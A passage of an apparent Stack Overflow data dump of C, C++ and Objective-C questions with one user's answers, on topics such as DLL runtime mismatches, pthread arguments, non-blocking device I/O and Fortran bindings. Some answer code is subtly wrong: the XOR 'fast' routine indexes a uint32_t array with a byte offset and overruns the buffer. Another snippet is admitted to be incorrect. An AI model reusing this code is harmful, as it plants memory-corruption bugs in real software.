   if((F1==NULL) || (F2==NULL) || (F3==NULL) || (F4==NULL)) {

        cout &lt;&lt; ""Unable to load function(s)."" &lt;&lt; endl;
        FreeLibrary((HMODULE)hLib);
        return;
   }

   F1();
   cout&lt;&lt;F2()&lt;&lt;endl;
   F3(1515);
   cout &lt;&lt; F4(12) &lt;&lt; endl;   //works now :)

   FreeLibrary((HMODULE)hLib);

   getch();

    return;
}
</code></pre>

<p>Output:</p>

<pre><code>Library loaded:
154827
It works
It works: 1515
</code></pre>

<p>Questions:<br>
1. Why is F1 displayed after F2? F1 is called before F2.<br>
2. F3 Works properly but makes a window pop up twice. I click Ignore on it.<br>
<img src=""http://s3.ifotos.pl/img/f3_hwpwapq.jpg"" alt=""""><br>
3. Why F4 doesn't work at all? It raises an exception.  </p>

<p>EDIT:<br>
Question 2 and 3 are solved now.</p>

<p>For 1, output now is:  </p>

<pre><code>Library loaded:  
154827  
13  
It works  
It works: 1515  
</code></pre>

<p>Which is in order: F2, F4, F1, F3.<br>
I call them: F1, F2, F3, F4.<br>
Why is it happening?</p>
","9530","","<p>What's likely happening is that your DLL and your executable are linking against different versions of the C++ runtime library.  Since there are now two different versions of the C++ runtime library living in your process's address space, there are two separate memory buffers being used for stdout.  Since you're not flushing the data inside your DLL functions but you <em>are</em> flushing it in your executable (note that printing a new line <code>'\n'</code> doesn't flush, but printing a <code>std::endl</code> <em>does</em> flush), this is what happens:</p>

<ol>
<li>F1 is called, and <code>""It works\n""</code> gets written into your DLL's libc++ stdout memory buffer.</li>
<li>F2 is called, and <code>154827\n</code> gets written into your executable's libc++ stdout memory buffer.  The call to <code>std::endl</code> flushes that buffer and prints it to the console.</li>
<li>F3 is called, and <code>""It works: 1515\n""</code> gets written into your DLL's libc++ stdout memory buffer.</li>
<li>F4 is called, and <code>13</code> gets written into your executable's libc++ stdout memory buffer.  The call to <code>std::endl</code> flushes that buffer and prints it to the console.</li>
<li>Your process exits, causing your DLL to get unloaded.  As part of its cleanup routine, libc++ flushes its output buffers, causing <code>""It works\nIt works: 1515\n""</code> to get printed to the console.</li>
</ol>

<p>This fix for this is to make sure that you're using the same C++ (and C) runtime libraries in your DLL and in your executable.  See <a href=""http://msdn.microsoft.com/en-us/library/abx4dbyh%28v=vs.80%29.aspx"" rel=""nofollow"">this page</a> for details on that—I recommend using the multithreaded release DLL version (<code>/MD</code> compiler option) for both the executable and DLL.</p>

<p>See also <a href=""http://msdn.microsoft.com/en-us/library/ms235460.aspx"" rel=""nofollow"">Potential Errors Passing CRT Objects Across DLL Boundaries</a>.</p>
"
"<p>I need to use a function in a obj file for which I don't have the source code. The function works well and does its job but it corrupts the stack (runtime esp was not properly saved.. error in visual studio c++ 2010), and I don't know assembly well enough to find the problem and patch it. (From what Ive read it has to do with not having an equal number of pops and pushes.) I have tried executing the function in a separate thread but since it shares the same memory as my main program, it also crashes. The function works and does everything it needs to do, expect that it corrupts the stack and make the application crash. Is there any way I can isolate it from my main application? Ive read about CreateProcess but from what I understood it executes a separate .EXE file which I don't want to do. I want to execute a function as if it was an external program, so it does not crash my main program even though it corrupts the stack. Anyway to do such a thing in C/C++? Or maybe someone has another idea to fix things up? Also, I don't care if its ""dirty"" or not standard compliant since im writing this program for personal use. Since the function does what it needs to do Im really trying to keep it even though it corrupts the call stack.</p>

<p>Thank you very much</p>
","9530","","<p>That smells very much like a calling convention mismatch.  Is it documented anywhere how the function is to be called?  Do you have a header file containing a function prototype for the function?  Try calling it with a different calling convention—if you're calling it as <code>cdecl</code>, try calling it as <code>stdcall</code>, or vice-versa.</p>

<p>See also <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/15/58973.aspx"" rel=""nofollow"">What can go wrong when you mismatch the calling convention?</a>.</p>
"
"<p>What is the function definition of the <code>printf()</code> function as defined in the standard C library?</p>

<p>I need the definition to solve the following question:</p>

<blockquote>
  <p>Give the output of the following:</p>

<pre><code>int main()
{
   int a = 2;
   int b = 5;
   int c = 10;
   printf(""%d "",a,b,c);
   return 0;
}
</code></pre>
</blockquote>
","9530","","<p>The C language standard declares <code>printf</code> as follows:</p>

<pre><code>int printf(const char *format, ...);
</code></pre>

<p>It returns an integer and takes a first parameter of a pointer to a constant character and an arbitrary number of subsequent parameters of arbitrary type.</p>

<p>If you happen to pass in more parameters than are required by the format string you pass in, then the extra parameters are ignored (though they are still evaluated).  From the C89 standard §4.9.6.1:</p>

<blockquote>
  <p>If there
  are insufficient arguments for the format, the behavior is undefined.
  If the format is exhausted while arguments remain, the excess
  arguments are evaluated (as always) but are otherwise ignored.</p>
</blockquote>
"
"<p>Is it possible to get a C++ application running in Windows to request administrator privileges from the operating system at run time?</p>

<p>I know it can be done at compile time, but can't seem to find anywhere whether it can be done at run time.</p>

<p>Thanks for your help!</p>

<p>EDIT: What if I want the current instance to have elevated privileges? For example, I might have data stored in memory which I want to keep.</p>
","9530","","<p>Not quite, but you can do the opposite—you can <em>drop</em> privileges if you already have them.  So, you can have your program start out running as an Administrator, using one of the methods listed by <a href=""http://stackoverflow.com/questions/6418791/requesting-administrator-privileges-at-run-time/6418873#6418873"">Kate Gregory</a>.  Then, drop your unneeded privileges; see <a href=""http://stackoverflow.com/questions/1533017/dropping-privileges-in-c-on-windows"">Dropping privileges in C++ on Windows</a> for how to do that.</p>
"
"<p>If I say:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char *x;
char *y;

int main() {
        x = malloc(sizeof(""Hello, world!""));
        strcpy(x, ""Hello world!"");
        y = ""Hello, world"";
        free(x);
        fprintf(stderr, ""okay"");
        free(y);
}
</code></pre>

<p>Then, obviously, the program will print ""okay"" followed by dying because the ""pointer being freed was not allocated""—obviously, because the string was a string literal.</p>

<p>I'd like to write a function that does nothing when given string literals, but calls free when given non-string literals. Is that possible, and if so, how?</p>
","9530","","<p>No.  In C, you have to keep track of what you've allocated yourself.</p>

<p>Some <code>malloc</code> implementations (such as <a href=""http://g.oswego.edu/dl/html/malloc.html"" rel=""nofollow""><code>dlmalloc</code></a>) provide some extra functionality for inspecting the heap, but you shouldn't rely on those.  <code>dlmalloc</code> has the function <code>dlmalloc_inspect_all</code>, which will walk the heap and return to you all of the regions of memory that <code>malloc</code> has allocated, except for memory-mapped chunks.  So you could use that to test if a pointer points to a non-memory-mapped allocation, but it's still a bad idea in general.</p>

<p>And on Windows, don't even think about using [<code>IsBadReadPtr</code>] to test if a pointer points to readable memory or not -- <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/09/27/773741.aspx"" rel=""nofollow"">it should really be called <code>CrashProgramRandomly</code></a>.</p>
"
"<p>I have an Objective-C class that implements a node for a data tree. Its properties are read-only to the public while a private extension of the class (not shown here) implements the properties' setters so a manager class can create the tree. </p>

<pre><code>// Interface
@interface DataSet : NSObject {
    NSString        *name;
    NSString        *data;
@private
    DataSet         *parent;
    NSMutableArray  *children;
}
@property (nonatomic, readonly, copy) NSString *name;
@property (nonatomic, readonly, copy) NSString *data;
</code></pre>

<p>I want to implement a custom getter for one of the properties that, if the property is nil, will walk up the tree until it finds an ancestor node that has a non-nil value for that property. </p>

<p>My problem is implementing the getter without causing an infinite recursion of the getter calling itself. </p>

<pre><code>// Implementation
@interface DataSet ()
@property (nonatomic, retain) DataSet           *parent;
@property (nonatomic, retain) NSMutableArray    *children;
@end

@implementation DataSet

@synthesize name;
// do not @synthesize data
@synthesize parent, children;

// custom getter walks up tree to find first non-nil 'data' property
- (NSString*) data {
    NSString *result = nil;
    DataSet *set = self;
    while (set != nil &amp;&amp; result == nil) {
        result = [set data];    // &lt;=== INFINITE RECURSION HERE
        set = set.parent;
    }
    return result;
}
</code></pre>

<p>I've searched through this and other forums but haven't found any examples of what I'm trying to do here. Anyone have any suggestions?</p>

<p>Also, should the last line in the getter be </p>

<pre><code>return [result copy];
</code></pre>

<p>?</p>
","9530","","<p>Just access the ivar directly:</p>

<pre><code>// custom getter walks up tree to find first non-nil 'data' property
- (NSString*) data {
    NSString *result = nil;
    DataSet *set = self;
    while (set != nil &amp;&amp; result == nil) {
        result = set-&gt;data;
        set = set-&gt;parent;
    }
    return [result copy];
}
</code></pre>

<p>This avoids calling the property accessor and therefore avoids recursion.</p>

<p>And yes, the last line should be <code>return [result copy];</code>, because you declared your property as having the <code>copy</code> property.  If you hadn't declared it with the <code>copy</code> property, then you would not return a copy.</p>
"
"<p>The spec says that at phase 1 of compilation</p>

<blockquote>
  <p>Any source ﬁle character not in the basic source character set (2.3) is replaced by the universal-character-name that designates that character. </p>
</blockquote>

<p>And at phase 4 it says</p>

<blockquote>
  <p>Preprocessing directives are executed, macro invocations are expanded</p>
</blockquote>

<p>At phase 5, we have</p>

<blockquote>
  <p>Each source character set member in a character literal or a string literal, as well as each escape sequence and universal-character-name in a character literal or a non-raw string literal, is converted to the corresponding member of the execution character set </p>
</blockquote>

<p>For the <code>#</code> operator, we have</p>

<blockquote>
  <p>a <code>\</code> character is inserted before each <code>""</code> and <code>\</code> character of a character literal or string literal (including the delimiting <code>""</code> characters).</p>
</blockquote>

<p>Hence I conducted the following test</p>

<pre><code>#define GET_UCN(X) #X
GET_UCN(""€"")
</code></pre>

<p>With an input character set of UTF-8 (matching my file's encoding), I expected the following preprocessing result of the <code>#X</code> operation: <code>""\""\\u20AC\""""</code>. GCC, Clang and boost.wave don't transform the <code>€</code> into a UCN and instead yield <code>""\""€\""""</code>. I feel like I'm missing something. Can you please explain?</p>
","9530","","<p>I'm not sure where you got that citation for translation phase 1—the <a href=""http://code.google.com/p/yesanshare/downloads/detail?name=ISO-C-FDIS.1999-04.pdf&amp;can=2&amp;q="" rel=""nofollow"">C99 standard</a> says this about translation phase 1 in §5.1.1.2/1:</p>

<blockquote>
  <p>Physical source file multibyte characters are mapped, in an implementation-defined manner, to the source character set (introducing new-line characters for end-of-line indicators) if necessary. Trigraph sequences are replaced by corresponding single-character internal representations.</p>
</blockquote>

<p>So in this case, the Euro character € (represented as the multibyte sequence E2 82 AC in UTF-8) is mapped into the execution character set, which also happens to be UTF-8, so its representation remains the same.  It doesn't get converted into a universal character name because, well, there's nothing that says that it should.</p>
"
"<p>It is possible to write a function, which, when compiled with a C compiler will return 0, and when compiled with a C++ compiler, will return 1 (the trivial sulution with 
<code>#ifdef __cplusplus</code> is not interesting). </p>

<p>For example:</p>

<pre><code>int isCPP()
{
    return sizeof(char) == sizeof 'c';
}
</code></pre>

<p>Of course, the above will work only if <code>sizeof (char)</code> isn't the same as <code>sizeof (int)</code></p>

<p>Another, more portable solution is something like this:</p>

<pre><code>int isCPP()
{
    typedef int T;
    {
       struct T 
       {
           int a[2];
       };
       return sizeof(T) == sizeof(struct T);
    }
}
</code></pre>

<p>I am not sure if the examples are 100% correct, but you get the idea. I believe there are other ways to write the same function too.</p>

<p>What differences, if any, between C++03 and C++0x can be detected at run-time? In other words, is it possible to write a similar function which would return a boolean value indicating whether it is compiled by a conforming C++03 compiler or a C++0x compiler?</p>

<pre><code>bool isCpp0x()
{ 
    //???
} 
</code></pre>
","9530","","<p>This isn't quite a correct example, but it's an interesting example that can distinguish C vs. C++0x (it's invalid C++03 though):</p>

<pre><code> int IsCxx03()
 {
   auto x = (int *)0;
   return ((int)(x+1) != 1);
}
</code></pre>
"
"<p>what will be the output of the following code :</p>

<pre><code>char peer_ip[16];
inet_pton(AF_INET,""127.0.0.1"",peer_ip);
</code></pre>

<p>now I have peer_ip in network form. How can I check what is the address family ??? I cannot use inet_ntop now. Is there any way ?? Will getaddrinfo work in this case ???</p>
","9530","","<p>You can't—<code>inet_pton</code> gives you either a <code>struct in_addr</code> (for <code>AF_INET</code>) or a <code>struct in6_addr</code> (for <code>AF_INET6</code>), depending on what address family you pass in.  If you consider these structures to be binary blobs of memory, there's no way you can recover the address family from them, you just have to keep track of what type of binary blob you have.</p>

<p>You should really be using a <code>struct in_addr</code>, not a <code>char[16]</code> as the value passed into <code>inet_pton</code>:</p>

<pre><code>struct in_addr peer_ip;
inet_pton(AF_INET, ""127.0.0.1"", &amp;peer_ip);
</code></pre>
"
"<pre><code>class D: A
{
    B obj;
    C obj2;
}
</code></pre>

<p>What order of construction here is <em>guaranteed</em>?</p>

<p>I know that D will be constructed after A, B and C, but what I really want to know is whether A is <em>guaranteed</em> to be constructed before B or C, or even whether B is <em>guaranteed</em> to be constructed before C.</p>

<p>I know you can have an explicit initialiser list:</p>

<pre><code>D(): A(), B(), C()
{}
</code></pre>

<p>but does that initialiser list determine the <em>order</em> of initialisation?</p>

<p>Also, does whether or not any of the components do or don't have a default constructor?</p>
","9530","","<p>From the C++03 standard ISO/IEC 14882:2003(E) §12.6.2/5 [class.base.init]:</p>

<blockquote>
  <p>Initialization shall proceed in the following order:<br>
  — First, and only for the constructor of the most derived class as described below, virtual base classes shall be initialized in the order they appear on a depth-first left-to-right traversal of the directed acyclic graph of base classes, where “left-to-right” is the order of appearance of the base class names in the derived class <em>base-specifier-list</em>.<br>
  — Then, direct base classes shall be initialized in declaration order as they appear in the <em>base-specifier-list</em> (regardless of the order of the <em>mem-initializers</em>).<br>
  — Then, nonstatic data members shall be initialized in the order they were declared in the class definition (again regardless of the order of the <em>mem-initializers</em>).<br>
  — Finally, the body of the constructor is executed.<br>
  [<em>Note:</em> the declaration order is mandated to ensure that base and member subobjects are destroyed in the reverse order of initialization. ]</p>
</blockquote>

<p>So in this case, you are guaranteed that the order of initialization will be first the base class <code>A</code>, then the subobject <code>B</code> (since it appears first in the list of class members in the class definition), then the subobject <code>C</code>.  The order of the initializer list is irrelevant, as is whether or not any of the members do or do not have a default constructor—if a member does not have a default constructor and it is not explicitly initialized in an initializer list, then it has an unspecified value.</p>
"
"<p>I am playing around with xor decoding via a small C file, and am running into issues with endianness ...I am a bit stuck on how to work around them.  This is really the first time I've played this deeply with bitwise operations in C.</p>

<p>If I use a one-byte xor key and pick up several xor-encoded values into a uint8_t pointer, my basic code works fine.  Walk each byte, xor it against the key, and store the result in a decoded byte array/buffer and then print it back to the console.</p>

<p>However, if I try a two-byte xor key, then endianness starts to get in the way.  I currently stick the key into a uint32_t, because I don't plan on dealing with xor keys greater than 32bits.  On a little-endian system, a xor key of <code>0xc39f</code> gets stored as <code>0x9fc3</code>.  The bytes to be decoded are big-endian if I play them back one byte at a time, but they too, get flipped to little-endian if I try to play them back two-bytes at a time (same size as the xor key).</p>

<p>I am tempted to <code>#include &lt;byteswap.h&gt;</code> and then call <code>bswap_32()</code>.  But while this will work on little endian, it might have the opposite effect on big-endian.  I assume then I'd need ugly #ifdef's to only use <code>bswap_32()</code> for little-endian archs.  I figure, there has got to be a more portable way for this to work.</p>

<p>Random sample string:</p>

<pre class=""lang-none prettyprint-override""><code>g   e   n   e   r   a   t   e
67  65  6e  65  72  61  74  65

Xor 0xc39f

a4  fa  ad  fa  b1  fe  b7  fa
</code></pre>

<p><br>If I play back the xor-encoded buffer with two-byte (uint16_t) pointers, I get this (via a basic printf):</p>

<pre class=""lang-none prettyprint-override""><code>0xfaa4 0xfaad 0xfeb1 0xfab7
</code></pre>

<p><br>And with four-byte pointers (uint32_t):</p>

<pre class=""lang-none prettyprint-override""><code>0xfaadfaa4 0xfab7feb1
</code></pre>

<p><br><br>I would expect for the above, to get instead for two-byte pointers:</p>

<pre class=""lang-none prettyprint-override""><code>0xa4fa 0xadfa 0xb1fe 0xb7fa
</code></pre>

<p>And four-byte pointers:</p>

<pre class=""lang-none prettyprint-override""><code>0xa4faadfa 0xb1feb7fa
</code></pre>

<p><br>Thoughts?</p>

<p><br><br><strong>Edit:</strong> Any takers?  Current answers aren't adequate to my needs.</p>
","9530","","<p>You're overthinking this—just treat your xor key as an endianless binary blob, and convert it to a native <code>uint32_t</code> for performance:</p>

<pre><code>void xor_encrypt_slow(uint8_t *data, size_t len, uint8_t key[4])
{
    // key is a 4-byte xor key
    size_t i;
    for(i = 0; i &lt; len; i++)
        data[i] ^= key[i % 4];
}

void xor_encrypt_fast(uint8_t *data, size_t len, uint8_t key[4])
{
    // Convert key to a 32-bit value
    uint32_t key32 = *(uint32_t *)key;

    // This assumes that data is aligned on a 4-byte boundary; if not, adjust
    // accordingly
    size_t i;
    for(i = 0; i + 3 &lt; len; i += 4)
        ((uint32_t *)data)[i] ^= key32;
    // Handle the remainder, if len is not a multiple of 4
    for( ; i &lt; len; i++)
        data[i] ^= key[i % 4];
}
</code></pre>
"
"<p>I am trying to pass 2 unsigned integers to a newly created thread in C (using pthread_create()) but nor an array of 2 integers or a struct seems to work.</p>

<pre><code>// In my socket file

struct dimension {
    unsigned int width;
    unsigned int height;
};

unsigned int width, height;

void setUpSocket(void* dimension) {

    struct dimension* dim = (struct dimension*) dimension;

    width = dim-&gt;width;
    height = dim-&gt;height;

    printf(""\n\nWidth: %d, Height: %d\n\n"", width, height);

}

// In main.cpp

// Pass a struct in pthread_create
struct dimension dim;
dim.width = w;
dim.height = h;

pthread_create(&amp;ph, &amp;attr, (void * (*)(void *)) setUpSocket, (void *) &amp;dim);
</code></pre>

<p>Before calling pthread_create, dim.width and dim.height are correct. In my socket file, only width is set, height is 0, and I do not understand why.</p>

<p>Does anyone know what is wrong please and how to fix it?</p>

<p>Thank you very much.</p>
","9530","","<p>The way you're passing the arguments should work fine, <strong>as long as <code>dim</code> is not allocated on the stack</strong>.  If it's on the stack, then it could become deallocated before the new thread has a chance to run, resulting in undefined behavior.  If you're only creating one thread, you can use a global variable, but the better alternative is to allocate it on the heap.</p>

<p>Also, you should <em>not</em> be casting the function pointer: that is undefined behavior (and in fact, <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/19/60162.aspx"">it could crash due to speculative execution on the IA64 architecture</a>).  You should declare your thread procedure to return <code>void*</code> and avoid a function pointer cast:</p>

<pre><code>void *setUpSocket(void* dimension) {

    struct dimension* dim = (struct dimension*) dimension;

    width = dim-&gt;width;
    height = dim-&gt;height;
    // Don't leak the memory
    free(dim);

    printf(""\n\nWidth: %d, Height: %d\n\n"", width, height);

    return 0;
}

// In main.cpp

// Pass a struct in pthread_create (NOT on the stack)
struct dimension *dim = malloc(sizeof(struct dimension));
dim-&gt;width = w;
dim-&gt;height = h;

pthread_create(&amp;ph, &amp;attr, setUpSocket, dim);
</code></pre>
"
"<p>How can I read/write to a device in C++? the device is in <code>/dev/ttyPA1</code>.<br>
I thought about fstream but I can't know if the device has output I can read without blocking the application.<br>
My goal is to create and application where you write something into the terminal and it gets sent into <code>/dev/ttyPA1</code>. If the device has something to write back it will read it from the device and write to screen. If not it will give the user prompt to write to the device again.<br>
How can I do this?</p>
","9530","","<p>Use <a href=""http://linux.die.net/man/2/open"" rel=""nofollow""><code>open(2)</code></a>, <a href=""http://linux.die.net/man/2/read"" rel=""nofollow""><code>read(2)</code></a>, and <a href=""http://linux.die.net/man/2/write"" rel=""nofollow""><code>write(2)</code></a> to read from and write to the device (and don't forget to <a href=""http://linux.die.net/man/2/close"" rel=""nofollow""><code>close(2)</code></a> when you're done).  You can also use the C stdio functions (<a href=""http://linux.die.net/man/3/fopen"" rel=""nofollow""><code>fopen(3)</code></a> and friends) or the C++ fstream classes, but if you do so, you almost definitely want to disable buffering (<a href=""http://linux.die.net/man/3/setvbuf"" rel=""nofollow""><code>setvbuf(3)</code></a> for stdio, or <code>outFile.rdbuf()-&gt;pubsetbuf(0, 0)</code> for fstreams).</p>

<p>These will all operate in <em>blocking</em> mode, however.  You can use <a href=""http://linux.die.net/man/2/select"" rel=""nofollow""><code>select(2)</code></a> to test if it's possible to read from or write to a file descriptor without blocking (if it's not possible, you shouldn't do so).  Alternatively, you can open the file with the <code>O_NONBLOCK</code> flag (or use <a href=""http://linux.die.net/man/2/fcntl"" rel=""nofollow""><code>fcntl(2)</code></a> to set the flag after opening) on the file descriptor to make it non-blocking; then, any call to <code>read(2)</code> or <code>write(2)</code> that would block instead fails immediately with the error <code>EWOULDBLOCK</code>.</p>

<p>For example:</p>

<pre><code>// Open the device in non-blocking mode
int fd = open(""/dev/ttyPA1"", O_RDWR | O_NONBLOCK);
if(fd &lt; 0)
    ;  // handle error

// Try to write some data
ssize_t written = write(fd, ""data"", 4);
if(written &gt;= 0)
    ;  // handle successful write (which might be a partial write!)
else if(errno == EWOULDBLOCK)
    ;  // handle case where the write would block
else
    ;  // handle real error

// Reading data is similar
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/6517231/are-c-recursive-type-definitions-possible-in-particular-can-i-put-a-vectort"">Are C++ recursive type definitions possible, in particular can I put a vector&lt;T&gt; within the definition of T ?</a>  </p>
</blockquote>



<p>I was looking through some code recently and noticed a data structure similar to the following:</p>

<pre><code>class TreeNode {
    std::vector&lt;TreeNode&gt; subNodes;
};
</code></pre>

<p>As you can see, the container is instantiated with TreeNode before TreeNode has been defined. The code compiles under both GCC and MSVC, but I remember seeing something saying that this is not guaranteed behaviour. Unfortunately I can't find anything in the standard discussing this at all.</p>

<p>How are such containers able to be implemented? Is this behaviour guaranteed by the standard? If this is not guaranteed by the standard, what alternatives do I have to this design? </p>
","9530","","<p>This is fine because the <code>std::vector&lt;T&gt;</code> class doesn't contain any concrete instances of the type <code>T</code> in it: it's typically implemented using pointers.  The template instantiation <code>std::vector&lt;TreeNode&gt;</code> does not require the full definition of <code>TreeNode</code>.</p>

<p><code>std::vector&lt;T&gt;</code> is usually implemented as a triplet of pointers (though this is not required by the standard):</p>

<pre><code>template &lt;typename T&gt;
class vector
{
  ...
  T* start;
  T* end;
  T* end_of_storage;
};
</code></pre>

<p>If <code>std::vector&lt;T&gt;</code> <em>did</em> contain concrete instances of <code>T</code> in it, then you would have a problem.  The following is not legal C++, because it creates a circular ""has a"" definition:</p>

<pre><code>template &lt;typename T&gt;
class container
{
  T x;
};

class TreeNode
{
  container&lt;TreeNode&gt; subNodes;
};
</code></pre>
"
"<p>I was able to load a bitmap object (<strong>LoadImage</strong>) into executable (and implement it as an icon); however, when I release it as a standalone executable, the icon disappears. I found out that it requires the bitmap to be present in directory at runtime for this trick to work. However, my executable desktop icon will not change from default icon even with the bitmap present in current directory. I assume that this happens, because desktop icon should be determined during compiling time. Therefore, I want to know if there's a way to add resources into executable without the need of resource compiler? My desire is to have everything done with winapi. If that's not possible, then I'll consider alternatives. </p>
","9530","","<p>You could use <a href=""http://msdn.microsoft.com/en-us/library/ms648030%28v=VS.85%29.aspx"" rel=""nofollow""><code>BeginUpdateResource</code></a>, <a href=""http://msdn.microsoft.com/en-us/library/ms648049%28v=VS.85%29.aspx"" rel=""nofollow""><code>UpdateResource</code></a>, and <a href=""http://msdn.microsoft.com/en-us/library/ms648032%28v=VS.85%29.aspx"" rel=""nofollow""><code>EndUpdateResource</code></a> to add the bitmap resource to your executable as post-build step or something, but why avoid using the resource compiler?  It's really much easier, more straightforward, and future-proof than hacking your own solution.</p>
"
"<p>Does anybody know of a sparse SVD solver for c++? My problem involves some badly conditioned matrices that might have zeroed columns/rows. My data is stored in a uBLAS matrix which is the Harwell-Boeing sparse format. </p>

<p>I am having some trouble finding:</p>

<p>The SVD solver</p>

<ol>
<li>The SVD solver that can operate on sparse matrices. Lapack doesn't seem to be able to do this? I want to have sparse matrices passed to the function and sparse matrices output.</li>
<li>A way to recombine the results... So that I can read off the xs from x=b(A^-1). I would expect this to be x=(b)(v.(d^-1).(u^t))</li>
</ol>

<p>I am hoping to recreate the following two steps from GSL</p>

<pre><code>gsl_linalg_SV_decomp_jacobi (gsl_matrix * A, gsl_matrix * V, gsl_vector * S) 
gsl_linalg_SV_solve (const gsl_matrix * U, const gsl_matrix * V, const gsl_vector * S, const gsl_vector * b, gsl_vector * x)
</code></pre>

<p>I also have no clue how to wrap a FORTRAN library in c++.
Where/Are there any PROPACK c/c++ bindings?</p>

<p>Edit 1:
I'm having some trouble with PROPACK. Does PROPACK output sparse matrices? It seems to output V as ""V(LDV,KMAX): DOUBLE PRECISION array."" which would imply that it doesn't?</p>
","9530","","<p>You mentioned <a href=""http://soi.stanford.edu/~rmunk/PROPACK/"" rel=""nofollow"">PROPACK</a>.  Fortran is C-compatible, you just have to know how the calling convention works.  I'm not certain, but I think that the function you want to call in PROPACK is <code>dlansvd</code> (assuming double-precision), which is documented as follows:</p>

<pre><code>  subroutine dlansvd(jobu,jobv,m,n,k,kmax,aprod,U,ldu,Sigma,bnd,
 c     V,ldv,tolin,work,lwork,iwork,liwork,doption,ioption,info,
 c     dparm,iparm)


c     DLANSVD: Compute the leading singular triplets of a large and
c     sparse matrix by Lanczos bidiagonalization with partial
c     reorthogonalization.
c
c     Parameters:
c
c     JOBU: CHARACTER*1. If JOBU.EQ.'Y' then compute the left singular vectors.
c     JOBV: CHARACTER*1. If JOBV.EQ.'Y' then compute the right singular 
c           vectors.
c     M: INTEGER. Number of rows of A.
c     N: INTEGER. Number of columns of A.
c     K: INTEGER. Number of desired singular triplets. K &lt;= MIN(KMAX,M,N)
c     KMAX: INTEGER. Maximal number of iterations = maximal dimension of
c           the generated Krylov subspace.
c     APROD: Subroutine defining the linear operator A. 
c            APROD should be of the form:
c
c           SUBROUTINE DAPROD(TRANSA,M,N,X,Y,DPARM,IPARM)
c           CHARACTER*1 TRANSA
c           INTEGER M,N,IPARM(*)
c           DOUBLE PRECISION X(*),Y(*),DPARM(*)
c
c           If TRANSA.EQ.'N' then the function should compute the matrix-vector
c           product Y = A * X.
c           If TRANSA.EQ.'T' then the function should compute the matrix-vector
c           product Y = A^T * X.
c           The arrays IPARM and DPARM are a means to pass user supplied
c           data to APROD without the use of common blocks.
c     U(LDU,KMAX+1): DOUBLE PRECISION array. On return the first K columns of U
c               will contain approximations to the left singular vectors 
c               corresponding to the K largest singular values of A.
c               On entry the first column of U contains the starting vector
c               for the Lanczos bidiagonalization. A random starting vector
c               is used if U is zero.
c     LDU: INTEGER. Leading dimension of the array U. LDU &gt;= M.
c     SIGMA(K): DOUBLE PRECISION array. On return Sigma contains approximation
c               to the K largest singular values of A.
c     BND(K)  : DOUBLE PRECISION array. Error estimates on the computed 
c               singular values. The computed SIGMA(I) is within BND(I)
c               of a singular value of A.
c     V(LDV,KMAX): DOUBLE PRECISION array. On return the first K columns of V
c               will contain approximations to the right singular vectors 
c               corresponding to the K largest singular values of A.
c     LDV: INTEGER. Leading dimension of the array V. LDV &gt;= N.
c     TOLIN: DOUBLE PRECISION. Desired relative accuracy of computed singular 
c            values. The error of SIGMA(I) is approximately 
c            MAX( 16*EPS*SIGMA(1), TOLIN*SIGMA(I) )
c     WORK(LWORK): DOUBLE PRECISION array. Workspace of dimension LWORK.
c     LWORK: INTEGER. Dimension of WORK.
c            If JOBU.EQ.'N' and JOBV.EQ.'N' then  LWORK should be at least
c            M + N + 9*KMAX + 2*KMAX**2 + 4 + MAX(M+N,4*KMAX+4).
c            If JOBU.EQ.'Y' or JOBV.EQ.'Y' then LWORK should be at least
c            M + N + 9*KMAX + 5*KMAX**2 + 4 + 
c            MAX(3*KMAX**2+4*KMAX+4, NB*MAX(M,N)), where NB&gt;1 is a block 
c            size, which determines how large a fraction of the work in
c            setting up the singular vectors is done using fast BLAS-3 
c            operation. 
c     IWORK: INTEGER array. Integer workspace of dimension LIWORK.
c     LIWORK: INTEGER. Dimension of IWORK. Should be at least 8*KMAX if
c             JOBU.EQ.'Y' or JOBV.EQ.'Y' and at least 2*KMAX+1 otherwise.
c     DOPTION: DOUBLE PRECISION array. Parameters for LANBPRO.
c        doption(1) = delta. Level of orthogonality to maintain among
c          Lanczos vectors.
c        doption(2) = eta. During reorthogonalization, all vectors with
c          with components larger than eta along the latest Lanczos vector
c          will be purged.
c        doption(3) = anorm. Estimate of || A ||.
c     IOPTION: INTEGER array. Parameters for LANBPRO.
c        ioption(1) = CGS.  If CGS.EQ.1 then reorthogonalization is done
c          using iterated classical GRAM-SCHMIDT. IF CGS.EQ.0 then 
c          reorthogonalization is done using iterated modified Gram-Schmidt.
c        ioption(2) = ELR. If ELR.EQ.1 then extended local orthogonality is
c          enforced among u_{k}, u_{k+1} and v_{k} and v_{k+1} respectively.
c     INFO: INTEGER. 
c         INFO = 0  : The K largest singular triplets were computed succesfully
c         INFO = J&gt;0, J&lt;K: An invariant subspace of dimension J was found.
c         INFO = -1 : K singular triplets did not converge within KMAX
c                     iterations.   
c     DPARM: DOUBLE PRECISION array. Array used for passing data to the APROD
c         function.   
c     IPARM: INTEGER array. Array used for passing data to the APROD
c         function.   
c
c     (C) Rasmus Munk Larsen, Stanford, 1999, 2004 
c
</code></pre>

<p>In Fortran, the important things to remember is that all parameters are passed <em>by reference</em>, and non-sparse arrays are stored in <em>column-major</em> format.  So, the proper declaration of this function in C++ should be as follows (untested):</p>

<pre><code>extern ""C""
void dlansvd(const char *jobu,
             const char *jobv,
             int *m,
             int *n,
             int *k,
             int *kmax,
             void (*aprod)(const char *transa,
                           int *m,
                           int *n,
                           int *iparm,
                           double *x,
                           double *y,
                           double *dparm),
             double *U,
             int *ldu,
             double *Sigma,
             double *bnd,
             double *V,
             int *ldv,
             double *tolin,
             double *work,
             int *lwork,
             int *iwork,
             int *liwork,
             double *doption,
             int *ioption,
             int *info,
             double *dparm,
             int *iparm);
</code></pre>

<p>It's quite a beast.  Good luck!</p>
"
"<p>I've been doing some programming in perl lately, and I found that it throws a really useful warning - ""Use of uninitialized value"" when you try to do a compare / print / regex etc with a value that you somehow didn't initialize yet, (along with a host of other things I always didn't mean to do) and it got me wondering if there is some kind of extension or something that can give me some extra useful warnings in Objective-C?</p>

<p>I know with things like swizzling it would be possible to generate some runtime warnings, maybe with some clever code magic you could find a way to make Nil yell at you from time to time even, although that's tough because nil pointers need to evaluate false.</p>

